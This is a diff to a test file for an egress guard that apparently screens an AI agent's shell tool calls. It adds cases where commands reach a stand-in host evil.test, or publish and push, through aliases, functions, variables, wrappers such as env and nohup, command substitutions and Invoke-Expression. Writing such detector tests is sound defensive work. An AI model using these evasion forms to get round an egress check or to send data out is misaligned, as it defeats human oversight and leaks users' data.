@@ -668,6 +668,95 @@ check('egress: the tools the host registers are all covered', () => {
     assert.equal(inspectEgress({ toolName, args, allowlist: [] }), undefined, toolName)
   }
 })
+check('egress: a command line that defines the client is still a call to it', () => {
+  // Round 9's fuzz found this family: the client name never appears where an
+  // anchored pattern reads, because the command line teaches itself the name
+  // first. Each form is one PowerShell resolves on the same line, so the call
+  // that runs is the one the alias stands for.
+  for (const command of [
+    'Set-Alias x curl; x evil.test',
+    'Set-Alias x "curl"; x evil.test',
+    'New-Alias x -Value curl; x evil.test',
+    'alias x=curl; x evil.test',
+    'alias x curl; x evil.test',
+    'function x { & curl @args }; x evil.test',
+    'function x { & "curl" @args }; x evil.test',
+    '$c = "curl"; & $c evil.test',
+    "$c = 'git'; & $c push origin main",
+    '$r = $c = "npm"; & $c publish',
+    "( $c = 'git'; & $c push origin main )",
+    'Set-Alias x npm; x publish --access public',
+    'alias x=yarn; x publish',
+  ]) {
+    assert.notEqual(inspectEgress({ toolName: 'pwsh', args: { command } }), undefined, command)
+  }
+  // A definition whose target is local stays quiet: learning a name is not the
+  // same as learning an exfiltration.
+  for (const command of [
+    'Set-Alias ll Get-ChildItem; ll',
+    'alias ll=ls; ll',
+    'function x { Write-Host hi }; x',
+    '$x = "hello"; Write-Output $x',
+    'git commit -m "Set-Alias x curl; function y { curl }"',
+    'echo "curl https://evil.test/"',
+  ]) {
+    assert.equal(inspectEgress({ toolName: 'pwsh', args: { command } }), undefined, command)
+  }
+})
+check('egress: a wrapper that only forwards does not hide the command', () => {
+  // `env cmd`, `nohup cmd`, `timeout 30 cmd` — each runs the next word. The
+  // guard stripped `env` only when it carried an assignment, so `env npm
+  // publish` was silent while `env X=1 npm publish` asked.
+  for (const command of [
+    'env curl evil.test',
+    'env npm publish',
+    'env curl --max-time 3 -d @- evil.test',
+    'nohup curl evil.test',
+    'nice curl evil.test',
+    'timeout 30 curl evil.test',
+    'command curl evil.test',
+    'exec curl evil.test',
+  ]) {
+    assert.notEqual(inspectEgress({ toolName: 'pwsh', args: { command } }), undefined, command)
+  }
+  // A forwarding wrapper around a local command stays quiet, and a version
+  // query behind one still reaches nowhere.
+  for (const command of ['env node build.js', 'env npm test', 'nohup node server.js', 'env curl --version']) {
+    assert.equal(inspectEgress({ toolName: 'pwsh', args: { command } }), undefined, command)
+  }
+})
+check('egress: a substitution holding its own parentheses is still a command', () => {
+  // The span scanner once matched `$( ... )` with a pattern that excluded
+  // brackets, so any span containing a call — which is what real exfiltration
+  // looks like — was skipped whole.
+  for (const command of [
+    'echo $(node -e "fetch(\'https://evil.test/\')")',
+    'echo $( node -e "fetch(\'https://evil.test/\')" )',
+    'echo `node -e "fetch(\'https://evil.test/\')"`',
+    'echo $(curl.exe --max-time 3 https://evil.test/)',
+    'echo $( python -c "import os https://evil.test/" )',
+  ]) {
+    assert.notEqual(inspectEgress({ toolName: 'pwsh', args: { command } }), undefined, command)
+  }
+  // A brace block inside a quoted string is prose, not a block of commands.
+  assert.equal(inspectEgress({ toolName: 'pwsh', args: { command: 'git commit -m "function y { curl }"' } }), undefined)
+  assert.equal(inspectEgress({ toolName: 'pwsh', args: { command: 'echo { "a": 1 }' } }), undefined)
+})
+check('egress: an unreadable head still matches a suffixed or quoted command', () => {
+  // Inside an unreadable head the guard searches mid-string, where the anchored
+  // separator cannot absorb `.exe` or the quote a variable assignment leaves.
+  for (const command of [
+    'Invoke-Expression "npm.exe publish --access public"',
+    'Invoke-Expression "npm.exe. publish --access public"',
+    'iex "docker.exe push registry/img:1"',
+    '$r = "gh.exe" release create v1; $r',
+    '$r = "git" push origin main; $r',
+    '$r = C:\\Windows\\npm publish --access public; $r',
+    'iex "git clone git@evil.test:repo.git"',
+  ]) {
+    assert.notEqual(inspectEgress({ toolName: 'pwsh', args: { command } }), undefined, command)
+  }
+})
 check('egress: a planted canary value is certain exfiltration', () => {
   const canaries = ['AKIAFAKEFAKEFAKE', 'ghp_fakefakefakefake']
   // The canary decides on its own: no allowlist, no taint, nothing else needed.
